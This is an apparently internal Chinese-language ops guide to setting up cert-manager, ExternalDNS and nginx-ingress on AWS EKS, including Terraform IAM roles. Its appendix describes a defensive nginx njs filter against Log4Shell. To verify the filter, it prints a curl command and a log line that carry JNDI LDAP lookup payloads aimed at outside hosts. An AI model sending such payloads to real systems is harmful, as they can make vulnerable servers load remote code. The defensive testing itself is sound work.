## Overview

这篇文档主要是讲解如何在Kubernetes 集群中签证书。（赶工，还不是因为要交接）

#### Cert-manager

Cert-manager是一个在Kubernetes 集群中提供证书的控制器。然后它将这些证书请求发送到`Let'sEncrypt` API服务器进行签名。这将生成一个Kubernetes `Secret`形式的签名证书。

Ingress资源自动生成证书时，使用如下注解即可

```yaml
annotation:
  cert-manager.io/cluster-issuer: <reference-to-ClusterIssuer>
```



#### External DNS

`ExternalDNS`运行在集群中，在AWS DNS中创建DNS记录。根据云提供商的不同例如AWS Route53。它可以监视`Ingress `资源以及带注释的LoadBalancer Service和 自动为相应的endpoint 创建DNS记录的入口控制器通过七层路由，所以它是可能的在本地计算机上配置主机名并将其指向入口控制器服务，这是一个繁琐和复杂的的过程。ExternalDNS自动化此过程。

通过Kustomize变量传递的BASE_DOMAIN被设置为`--domain filter`，这意味着这些实例将只处理这个domain name下的完全限定域名的DNS记录。Service 被ExternalDNS忽略，除非metadata  annatation使用 `external-dns.alpha.kubernetes.io/hostname:` 

Service使用以下注释， Ingress则只需要在host里面命中域名即可

```yaml
annotation:
  external-dns.alpha.kubernetes.io/hostname:: <reference-to-hostname>
```



#### Nginx-ingress

运行在Kubernets集群内部的容器可以通过Pod to Service通信相互通信。Kubernetes中使用一个入口控制器，以一种简单的方式将集群内的服务公开给集群外的客户端。nginx-ingress是我们使用的入口控制器。每个入口控制器需要一个LoadBalancer服务，该服务将给它一个集群外的ip。流量通过负载均衡器流向集群内部的入口控制器实例，然后流量被第7层路由到正确的pod。

nginx-ingress 可以安装多个，根据我们对不同客户，某些客户在微软云上我们会安装两个nginx-ingress 使用不同的`ingressClassName`  一个是在private dns暴露服务在内网使用， 一个是在public dns暴露服务在公网使用。

而在亚马逊云上，我们只安装了一个nginx-ingress 暴露服务在内网使用，暴露到外网我们是使用了CEP , 这个`ingressClassName`我们设置成`private`

因此，在用户级别只需要添加以下annotation 或者直接使用`spec.ingressClassName`

```yaml
# 方法一 声明使用哪个ingressClass
annotations:
    kubernetes.io/ingress.class: "private"
# 方法二 声明使用哪个ingressClass
spec:
  ingressClassName: private
```

从安全的角度出发，某些服务是对全世界开放，如下所示。 某些只是对公司网络开放需要设置成公司网段

```yaml
  annotations:
    custom.nginx.org/allowed-ips: 0.0.0.0/0
```



(这篇文档是以AWS 平台为主来讲解)



## 组件

| 名字                    | URL                                             | Download link                                            |
| ----------------------- | ----------------------------------------------- | -------------------------------------------------------- |
| Cert-manager            | https://github.com/jetstack/cert-manager        | https://github.com/jetstack/cert-manager/releases/v1.6.0 |
| cert-manager-helm-chart | https://github.com/jetstack/cert-manager        | https://github.com/jetstack/cert-manager/                |
| External-dns            | https://github.com/kubernetes-sigs/external-dns | https://github.com/kubernetes-sigs/external-dns          |
| Nginx-ingress           | https://github.com/nginxinc/kubernetes-ingress  | https://github.com/nginxinc/kubernetes-ingress           |



## 架构图

待补



## 部署

所有在组件里面提到的基本遵守官网的安装即可，值得注意或者修改的我基本都写下来了

#### Nginx-ingress

除了对以下更改，我们还对nginx template进行了修改，看附录1

```yaml
# nginx-ingress可以安装多个，然后设置不同的Class
ingressClass: private
# service我们设置成LoadBalancer， 并且加上aws的anntation
      service:
        type: LoadBalancer
        annotations:
           service.beta.kubernetes.io/aws-load-balancer-internal: "true"
           service.beta.kubernetes.io/aws-load-balancer-type: "nlb"
```



#### External dns

```yaml
# 选择对service以及ingress 资源类型的监听
    sources:
      - service
      - ingress
# 云平台以及对应的domainFilters（也就是ingress host里面的域名如果命中则去route53创建A记录）
    provider: aws
    txtOwnerId: internal-dns
    ignoreHostnameAnnotation: false
    domainFilters:
      - ${BASE_DOMAIN}
    aws:
      region: ${REGION}
      zoneType: private
  #assumeRoleArn:
    affinity: {}
    policy: upsert-only
    registry: "txt"

# 创建serviceaccount，并且annotation带上我们的EKS权限
    serviceAccount:
      create: true
      name: external-dns-private
      annotations:
        eks.amazonaws.com/role-arn: "arn:aws:iam::${AWS_ACCOUNT_ID}:role/${ENVIRONMENT_NAME}-external-dns-private-xx-platform"
```



#### Cert-manager

Cert-manager 使用 Helm chart安装

```yaml
# 创建serviceaccount，并且annotation带上我们的EKS权限
    serviceAccount:
      annotations:
        eks.amazonaws.com/role-arn: "arn:aws:iam::${AWS_ACCOUNT_ID}:role/${ENVIRONMENT_NAME}-cert-manager-xx-platform"
# 安装对应的组件
    cainjector:
      image:
        repository: jetstack/cert-manager-cainjector
        tag: v1.6.0
    webhook:
      hostNetwork: true
      securePort: 10251
      image:
        repository: jetstack/cert-manager-webhook
        tag: v1.6.0
    startupapicheck:
      image:
        repository: jetstack/cert-manager-ctl
        tag: v1.6.0
    extraArgs: ["--dns01-recursive-nameservers=8.8.8.8:53,1.1.1.1:53"]
```

clusterissuer

这里我们创建两个clusterissuer， 一个是自签的，一个是使用let's encrypt 签发的证书

```yaml
apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: cert-manager-self-signing
spec:
  selfSigned: {}
---
apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: cluster-issuer-awsroute53
spec:
  acme:
    # You must replace this email address with your own.
    # Let's Encrypt will use this to contact you about expiring
    # certificates, and issues related to your account.
    email: ${EMAIL_FOR_CLUSTERISSUER}
    server: "https://acme-v02.api.letsencrypt.org/directory"
    #server: ${ACME_SERVER_URL}
    privateKeySecretRef:
      # Secret resource that will be used to store the account's private key.
      name: cluster-issuer-awsroute53-account-key
    solvers:
      - selector:
          dnsZones:
            - "${BASE_DOMAIN}"
        dns01:
          route53:
            region: ${REGION}
```





#### EKS 权限

在部署完成EKS 之后，还需要在EKS里面创建以下role并且把role attach到EKS使用的policy中

```terraform
inputs = {
  environment             = local.environment
  cluster_oidc_issuer_url = dependency.eks.outputs.ekscluster_output.identity.0.oidc.0.issuer

  roles = {
    cert-manager = {
      namespace      = "xx-platform"
      description    = "Role and policy for certmanager"
      serviceaccount = "xx-cert-manager"
      policy = [
        {
          "sid" : "allowgetchange"
          "actions" : ["route53:GetChange"],
          "effect" : "Allow",
          "resources" : ["arn:aws:route53:::change/*"]
        },
        {
          "sid" : "allowlisthostedzones"
          "actions" : ["route53:ListHostedZonesByName"],
          "effect" : "Allow",
          "resources" : ["*"]
        },
        {
          "sid" : "allowchangerecordsets"
          "actions" : ["route53:ChangeResourceRecordSets"],
          "effect" : "Allow",
          "resources" : ["arn:aws:route53:::hostedzone/*"]
        }
      ]
    }
    external-dns-private = {
      namespace      = "xx-platform"
      description    = "Role and policy for External DNS Private"
      serviceaccount = "external-dns-private"
      policy = [
        {
          "sid" : "allowgetchange"
          "actions" : ["route53:ChangeResourceRecordSets"],
          "effect" : "Allow",
          "resources" : ["arn:aws:route53:::hostedzone/*"]
        },
        {
          "sid" : "allowlisthostedzones"
          "actions" : ["route53:ListHostedZones",
          "route53:ListResourceRecordSets"],
          "effect" : "Allow",
          "resources" : ["*"]
        }
      ]
    }
    external-dns-central = {
      namespace      = "xx-platform"
      description    = "Role and policy for External DNS Central"
      serviceaccount = "external-dns-central"
      policy = [
        {
          "sid" : "allowgetchange"
          "actions" : ["route53:ChangeResourceRecordSets"],
          "effect" : "Allow",
          "resources" : ["arn:aws:route53:::hostedzone/*"]
        },
        {
          "sid" : "allowlisthostedzones"
          "actions" : ["route53:ListHostedZones",
          "route53:ListResourceRecordSets"],
          "effect" : "Allow",
          "resources" : ["*"]
        }
      ]
    }
    ecr-operator = {
      namespace      = "xx-platform"
      description    = "Role and policy required by ecr operator to create ecr credentials to be used by flux/helm operator"
      serviceaccount = "ecr-operator"
      policy = [
        {
          "sid" : "allowOperatorAccesstoECR",
          "effect" : "Allow",
          "actions" : [
            "ecr:GetAuthorizationToken",
            "ecr:BatchCheckLayerAvailability",
            "ecr:GetDownloadUrlForLayer",
            "ecr:GetRepositoryPolicy",
            "ecr:DescribeRepositories",
            "ecr:ListImages",
            "ecr:DescribeImages",
            "ecr:BatchGetImage",
            "ecr:ListTagsForResource"
          ],
          "resources" : ["arn:aws:ecr:*"]
        }
      ]
    }
  }
}
```



如下所示，上面的terragrunt调取下面的terraform 

```terraform
locals {
  oidc_provider    = replace(var.cluster_oidc_issuer_url, "https://", "")
  arn              = "arn:${data.aws_partition.current.partition}:iam::${data.aws_caller_identity.current.account_id}"
  policy_principal = "${local.arn}:oidc-provider/${local.oidc_provider}"
  annotations      = [for k, v in var.roles : "eks.amazonaws.com/role-arn: ${local.arn}:role/${var.environment}-${k}-${v.namespace}"]
}

data "aws_caller_identity" "current" {}

data "aws_iam_policy_document" "self" {
  for_each = var.roles
  dynamic "statement" {
    for_each = [for p in each.value.policy : {
      sid       = p.sid
      effect    = p.effect
      resources = p.resources
      actions   = p.actions
    }]

    content {
      sid       = statement.value.sid
      effect    = statement.value.effect
      resources = statement.value.resources
      actions   = statement.value.actions
    }
  }
}

data "aws_partition" "current" {}

resource "aws_iam_policy" "self" {
  for_each    = var.roles
  name_prefix = "${var.environment}-${each.key}-${each.value.namespace}"
  description = each.value.description
  policy      = data.aws_iam_policy_document.self[each.key].json
}

resource "aws_iam_role" "self" {
  for_each           = var.roles
  name               = "${var.environment}-${each.key}-${each.value.namespace}"
  assume_role_policy = <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "${local.policy_principal}"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "${local.oidc_provider}:sub": "system:serviceaccount:${each.value.namespace}:${each.value.serviceaccount}"
                }
            }
        }
    ]
}
    EOF
  tags               = var.resource_tags
}

resource "aws_iam_role_policy_attachment" "self" {
  for_each   = var.roles
  policy_arn = aws_iam_policy.self[each.key].arn
  role       = aws_iam_role.self[each.key].name
}
```



## 组件流程

1. External-dns 在AWS DNS zone创建DNS record
2. Cluster-issuer-route53 在ingress 资源里面告诉cert-manager去创建certificate
3. cert-manager  去Let's encrypt 创建一个签名的request 并且接受ACME的返回
4. cert-manager 在DNS 里面添加ACME token
5. let's Encrypt 验证token 
6. Lets encrypt 返回签名的证书certificate给cert-manager
7. cert-manager 保存cert跟key 在K8S secret里面(这个secret就是ingress tls那里指定的文件名)

## 用户排查流程

用户看到的排查图

![](./images/用户排查图.png)



当我们的ingress资源，如下例子所示，加上annotation `cert-manager.io/cluster-issuer: cluster-issuer-awsroute53`之后并且添加tls-- secretName之后

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    cert-manager.io/cluster-issuer: cluster-issuer-awsroute53
  name: xx-external
spec:
  ingressClassName: private
  rules:
  - host: aa.xx.xx.net
    http:
      paths:
      - backend:
          service:
            name: xx-external-http
            port:
              name: http
        path: /
        pathType: ImplementationSpecific
  tls:
  - hosts:
    - aa.xx.xx.net
    secretName: keycloak-tls
```

同时，external-dns会使用domain filter发现ingress的host 命中domain之后，在route53创建A记录以及TXT 记录

![](./images/external-dns-A-record.png)



然后nginx ingress controller 会在同一个namespace创建以下certificate

```yaml
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: xx-tls
  ownerReferences:
  - apiVersion: networking.k8s.io/v1
    blockOwnerDeletion: true
    controller: true
    kind: Ingress
    name: xx-external
    uid: eea9510e-4332-4ba0-80e7-66c8e8c6e813
spec:
  dnsNames:
  - aa.xx.xx.net
  issuerRef:
    group: cert-manager.io
    kind: ClusterIssuer
    name: cluster-issuer-awsroute53
  secretName: xx-tls
  usages:
  - digital signature
  - key encipherment
```

接下来，我们需要观察cert-manager是否把我们ingress 指定tls的secret创建并且填充证书

![](./images/secret-cert.png)





## 常见问题

证书没有签发下来



## 用户如何创建ingress

要使用patch.. 千万不能直接把各种annotation写死在ingress里面，毕竟我们客户多，每个不同云平台，每朵云架构还不太一样。

让用户先写以下ingress文件

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: xx-test
  annotations:
    # don't config these annotations here, patch it from tech-service if you need: cluster-issuer, ingress class, external-dns, allowed-ips
    # only keep your own annotations, example:
    nginx.ingress.kubernetes.io/cors-allow-origin: "*"
    nginx.ingress.kubernetes.io/enable-cors: "true"
    nginx.ingress.kubernetes.io/cors-allow-methods: "PUT, GET, POST, OPTIONS, DELETE, PATCH"
spec:
  rules:
  - host: xx-test.xxx.xx
    http:
      paths:
      - backend:
          service:
            name: xx
            port:
              number: 8080
        path: /
        pathType: ImplementationSpecific
  tls:
  - hosts:
    - xx-test.${BASE_DOMAIN}
    secretName: xx-test-tls
```



以下是使用了Flux的Kustomization去替换的例子

```yaml
---
apiVersion: kustomize.toolkit.fluxcd.io/v1beta1
kind: Kustomization
metadata:
  name: ingress-example
spec:
  targetNamespace: xx-platform
  interval: 5m
  path: "deploy/flux2/example/ingress/"                            # your kustomization
  patchesJson6902:
  - target:
      group: networking.k8s.io
      version: v1
      kind: Ingress
      name: xx-k8s-ingress-central
    patch:
    # 1) add cluster-issuer annotation
    - op: add
      path: /metadata/annotations/cert-manager.io~1cluster-issuer
      value: cluster-issuer-vault-central                            # Difference clusterissuer name according to your requirement
    # 3) add external-dns annotation
    - op: add
      path: /metadata/annotations/external-dns.xx.net~1central      # Difference external-dns annotation name according to your requirement
      value: true
  postBuild:
    substituteFrom:
      - kind: ConfigMap
        name: cluster-vars
```



## 附录1

我们使用kustomize对nginx template进行了以下修改，这是有原因的，前阵子的log4j的漏洞影响面挺大的，修复那么多组件又不是分分钟就能搞定的事情。那么我们只能从我们入口想想能否从入口拦住，为我们争取多点修复时间。

参考链接来源：

<https://www.nginx.com/blog/mitigating-the-log4j-vulnerability-cve-2021-44228-with-nginx/#Is-NGINX-Affected-by-This-Vulnerability>

<https://github.com/tippexs/nginx-njs-waf-cve2021-44228><https://docs.nginx.com/nginx/admin-guide/dynamic-modules/nginscript/?_ga=2.8607927.34957381.1640258095-846761154.1640258095>

手工步骤：

下载CVE

```bash
cd /etc/nginx/conf.d
curl https://raw.githubusercontent.com/tippexs/nginx-njs-waf-cve2021-44228/main/cve.js -o cve.js
sed 's/let/var/g' cve.js
sed 's/const/var/g' cve.js
```

修改nginx.config

```bash
sed "1 a load_module modules/ngx_http_js_module.so;\n" nginx.conf
sed "15 a \ js_import cve from conf.d/cve.js;\n js_set \$isJNDI cve.inspect;\n js_set \$bodyScanned cve.postBodyInspect;\n" nginx.conf
```

修改之后，我们在nginx.config可以看到增加了以下部分

```
load_module modules/ngx_http_js_module.so;             # add this line  

http {
    js_import cve from conf.d/cve.js;                   # add this line    
    js_set $isJNDI cve.inspect;                     `   # add this line
    js_set $bodyScanned cve.postBodyInspect;            # add this line
```

接下来我们修改ingress-template如下所示，主要就是加了``if` `( $isJNDI = ``"1"` `) { ``return` `403` `"Not Allow!\n"``; } ``

```yaml
    - op: replace
      path: /spec/values/controller/config/entries
      value:
        http-snippets: |
          map $http_x_request_id $req_id {
            default   $http_x_request_id;
            ""        $request_id;
          }
        location-snippets: |
          proxy_set_header      X-Request-Id $req_id;
        ingress-template: |
          # configuration for {{.Ingress.Namespace}}/{{.Ingress.Name}}

          {{range $upstream := .Upstreams}}
          upstream {{$upstream.Name}} {
          	{{if ne $upstream.UpstreamZoneSize "0"}}zone {{$upstream.Name}} {{$upstream.UpstreamZoneSize}};{{end}}
          	{{if $upstream.LBMethod }}{{$upstream.LBMethod}};{{end}}
          	{{range $server := $upstream.UpstreamServers}}
          	server {{$server.Address}}:{{$server.Port}} max_fails={{$server.MaxFails}} fail_timeout={{$server.FailTimeout}} max_conns={{$server.MaxConns}};{{end}}
          	{{if $.Keepalive}}keepalive {{$.Keepalive}};{{end}}
          }{{end}}

          {{range $server := .Servers}}
          server {
            {{if (index $.Ingress.Annotations "custom.nginx.org/allowed-ips")}}
            {{range $ip := split (index $.Ingress.Annotations "custom.nginx.org/allowed-ips") ","}}
          	allow {{trim $ip}};
            {{end}}
          	deny all;
            {{end}}

          	{{if not $server.GRPCOnly}}
          	{{range $port := $server.Ports}}
          	listen {{$port}}{{if $server.ProxyProtocol}} proxy_protocol{{end}};
          	{{- end}}
          	{{end}}

          	{{if $server.SSL}}
          	{{if $server.TLSPassthrough}}
          	listen unix:/var/lib/nginx/passthrough-https.sock ssl{{if $server.HTTP2}} http2{{end}} proxy_protocol;
          	set_real_ip_from unix:;
          	real_ip_header proxy_protocol;
          	{{else}}
          	{{- range $port := $server.SSLPorts}}
          	listen {{$port}} ssl{{if $server.HTTP2}} http2{{end}}{{if $server.ProxyProtocol}} proxy_protocol{{end}};
          	{{- end}}
          	{{end}}
          	ssl_certificate {{$server.SSLCertificate}};
          	ssl_certificate_key {{$server.SSLCertificateKey}};
          	{{if $server.SSLCiphers}}
          	ssl_ciphers {{$server.SSLCiphers}};
          	{{end}}
          	{{end}}

          	{{range $setRealIPFrom := $server.SetRealIPFrom}}
          	set_real_ip_from {{$setRealIPFrom}};{{end}}
          	{{if $server.RealIPHeader}}real_ip_header {{$server.RealIPHeader}};{{end}}
          	{{if $server.RealIPRecursive}}real_ip_recursive on;{{end}}

          	server_tokens {{$server.ServerTokens}};

          	server_name {{$server.Name}};

          	{{range $proxyHideHeader := $server.ProxyHideHeaders}}
          	proxy_hide_header {{$proxyHideHeader}};{{end}}
          	{{range $proxyPassHeader := $server.ProxyPassHeaders}}
          	proxy_pass_header {{$proxyPassHeader}};{{end}}

          	{{- if and $server.HSTS (or $server.SSL $server.HSTSBehindProxy)}}
          	set $hsts_header_val "";
          	proxy_hide_header Strict-Transport-Security;
          	{{- if $server.HSTSBehindProxy}}
          	if ($http_x_forwarded_proto = 'https') {
          	{{else}}
          	if ($https = on) {
          	{{- end}}
          		set $hsts_header_val "max-age={{$server.HSTSMaxAge}}; {{if $server.HSTSIncludeSubdomains}}includeSubDomains; {{end}}preload";
          	}

          	add_header Strict-Transport-Security "$hsts_header_val" always;
          	{{end}}

          	{{if $server.SSL}}
          	{{if not $server.GRPCOnly}}
          	{{- if $server.SSLRedirect}}
          	if ($scheme = http) {
          		return 301 https://$host:{{index $server.SSLPorts 0}}$request_uri;
          	}
          	{{- end}}
          	{{end}}
          	{{- end}}

          	{{- if $server.RedirectToHTTPS}}
          	if ($http_x_forwarded_proto = 'http') {
          		return 301 https://$host$request_uri;
          	}
          	{{- end}}

          	{{- if $server.ServerSnippets}}
          	{{range $value := $server.ServerSnippets}}
          	{{$value}}{{end}}
          	{{- end}}

          	{{range $location := $server.Locations}}
          	location {{$location.Path}} {
          		{{with $location.MinionIngress}}
          		# location for minion {{$location.MinionIngress.Namespace}}/{{$location.MinionIngress.Name}}
          		{{end}}
          		{{if $location.GRPC}}
          		{{if not $server.GRPCOnly}}
          		error_page 400 @grpcerror400;
          		error_page 401 @grpcerror401;
          		error_page 403 @grpcerror403;
          		error_page 404 @grpcerror404;
          		error_page 405 @grpcerror405;
          		error_page 408 @grpcerror408;
          		error_page 414 @grpcerror414;
          		error_page 426 @grpcerror426;
          		error_page 500 @grpcerror500;
          		error_page 501 @grpcerror501;
          		error_page 502 @grpcerror502;
          		error_page 503 @grpcerror503;
          		error_page 504 @grpcerror504;
          		{{end}}

          		{{- if $location.LocationSnippets}}
          		{{range $value := $location.LocationSnippets}}
          		{{$value}}{{end}}
          		{{- end}}

          		grpc_connect_timeout {{$location.ProxyConnectTimeout}};
          		grpc_read_timeout {{$location.ProxyReadTimeout}};
          		grpc_send_timeout {{$location.ProxySendTimeout}};
          		grpc_set_header Host $host;
          		grpc_set_header X-Real-IP $remote_addr;
          		grpc_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
          		grpc_set_header X-Forwarded-Host $host;
          		grpc_set_header X-Forwarded-Port $server_port;
          		grpc_set_header X-Forwarded-Proto {{if $server.RedirectToHTTPS}}https{{else}}$scheme{{end}};

          		{{- if $location.ProxyBufferSize}}
          		grpc_buffer_size {{$location.ProxyBufferSize}};
          		{{- end}}
          		{{if $location.SSL}}
          		grpc_pass grpcs://{{$location.Upstream.Name}}{{$location.Rewrite}};
          		{{else}}
          		grpc_pass grpc://{{$location.Upstream.Name}}{{$location.Rewrite}};
          		{{end}}
          		{{else}}
          		proxy_http_version 1.1;
          		{{if $location.Websocket}}
          		proxy_set_header Upgrade $http_upgrade;
          		proxy_set_header Connection $connection_upgrade;
          		{{- else}}
          		{{- if $.Keepalive}}proxy_set_header Connection "";{{end}}
          		{{- end}}

          		{{- if $location.LocationSnippets}}
          		{{range $value := $location.LocationSnippets}}
          		{{$value}}{{end}}
          		{{- end}}

          		proxy_connect_timeout {{$location.ProxyConnectTimeout}};
          		proxy_read_timeout {{$location.ProxyReadTimeout}};
          		proxy_send_timeout {{$location.ProxySendTimeout}};
          		client_max_body_size {{$location.ClientMaxBodySize}};
          		proxy_set_header Host $host;
          		proxy_set_header X-Real-IP $remote_addr;
          		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
          		proxy_set_header X-Forwarded-Host $host;
          		proxy_set_header X-Forwarded-Port $server_port;
          		proxy_set_header X-Forwarded-Proto {{if $server.RedirectToHTTPS}}https{{else}}$scheme{{end}};
          		proxy_buffering {{if $location.ProxyBuffering}}on{{else}}off{{end}};

          		{{- if $location.ProxyBuffers}}
          		proxy_buffers {{$location.ProxyBuffers}};
          		{{- end}}
          		{{- if $location.ProxyBufferSize}}
          		proxy_buffer_size {{$location.ProxyBufferSize}};
          		{{- end}}
          		{{- if $location.ProxyMaxTempFileSize}}
          		proxy_max_temp_file_size {{$location.ProxyMaxTempFileSize}};
          		{{- end}}
          		{{if $location.SSL}}
          		proxy_pass https://{{$location.Upstream.Name}}{{$location.Rewrite}};
          		{{else}}
          		proxy_pass http://{{$location.Upstream.Name}}{{$location.Rewrite}};
          		{{end}}
          		{{end}}
          	}{{end}}
          	{{if $server.GRPCOnly}}
          	error_page 400 @grpcerror400;
          	error_page 401 @grpcerror401;
          	error_page 403 @grpcerror403;
          	error_page 404 @grpcerror404;
          	error_page 405 @grpcerror405;
          	error_page 408 @grpcerror408;
          	error_page 414 @grpcerror414;
          	error_page 426 @grpcerror426;
          	error_page 500 @grpcerror500;
          	error_page 501 @grpcerror501;
          	error_page 502 @grpcerror502;
          	error_page 503 @grpcerror503;
          	error_page 504 @grpcerror504;
          	{{end}}
          	{{if $server.HTTP2}}
          	location @grpcerror400 { default_type application/grpc; return 400 "\n"; }
          	location @grpcerror401 { default_type application/grpc; return 401 "\n"; }
          	location @grpcerror403 { default_type application/grpc; return 403 "\n"; }
          	location @grpcerror404 { default_type application/grpc; return 404 "\n"; }
          	location @grpcerror405 { default_type application/grpc; return 405 "\n"; }
          	location @grpcerror408 { default_type application/grpc; return 408 "\n"; }
          	location @grpcerror414 { default_type application/grpc; return 414 "\n"; }
          	location @grpcerror426 { default_type application/grpc; return 426 "\n"; }
          	location @grpcerror500 { default_type application/grpc; return 500 "\n"; }
          	location @grpcerror501 { default_type application/grpc; return 501 "\n"; }
          	location @grpcerror502 { default_type application/grpc; return 502 "\n"; }
          	location @grpcerror503 { default_type application/grpc; return 503 "\n"; }
          	location @grpcerror504 { default_type application/grpc; return 504 "\n"; }
          	{{end}}
          }{{end}}

```

验证是否拦截生效

从日志查看

```
2021/12/27 02:14:55 [error] 1200#1200: *12334 js: Found CVE2021-44228 IOC: $%7Bjndi:. Request was blocked! From 192.176.1.86
192.176.1.86 - - [27/Dec/2021:02:14:55 +0000] "GET /$%7Bjndi:$%7Blower:l%7D$%7Blower:d%7D$%7Blower:a%7D$%7Blower:p%7D://was-log4shell-$%7Bdate:YYYY%7DZF0IyjhuS5ZhlDpYPYIa.w.nessus.org%7D HTTP/1.1" 403 11 "-" [-] "curl/7.29.0" "-"
```

使用命令验证攻击

```bash
curl 'https://xx.xx.net:443/checkServicesStatus?test=${jndi:ldap://securityscanner.cyber-risk.upguard.com:443/ZruwmNQPOauH9cPJm0D8612_xyDLae5ZzeNO67Jix5Ht30mj/a}'
```

